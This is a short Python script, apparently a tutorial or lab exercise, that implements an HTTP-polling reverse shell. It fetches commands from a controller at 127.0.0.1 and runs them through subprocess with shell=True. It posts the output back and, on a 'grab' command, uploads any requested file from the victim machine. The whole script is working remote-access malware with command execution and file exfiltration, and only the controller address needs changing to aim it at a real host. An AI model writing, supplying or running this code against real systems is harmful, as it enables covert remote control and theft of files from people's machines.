import requests     #Library to be installed and imported
import subprocess 
import time
import os

while True: 

    req = requests.get('http://127.0.0.1')      # Send GET request to host machine
    command = req.text                             # Store the received txt into command variable
    print(command)

    if 'terminate' in command:
        break 

    elif 'grab' in command:
        grab,path=command.split('*')

        if os.path.exists(path):
            url='http://127.0.0.1/store'   #Append /store in the URL
            files = {'file': open(path, 'rb')} # Add a dictionary key where file will be stored
            r=requests.post(url, files=files) # Send the file
            #requests library use POST method called "multipart/form-data"
        else:
            post_response = requests.post(url='http://127.0.0.1', data='[-] Not able to find the file !' )
    else:
        CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        post_response = requests.post(url='http://127.0.0.1', data=CMD.stdout.read(), cookies={"id":"1"}) 
        #post_response = requests.post(url='http://127.0.0.1', data=CMD.stderr.read() )  
    time.sleep(3)

    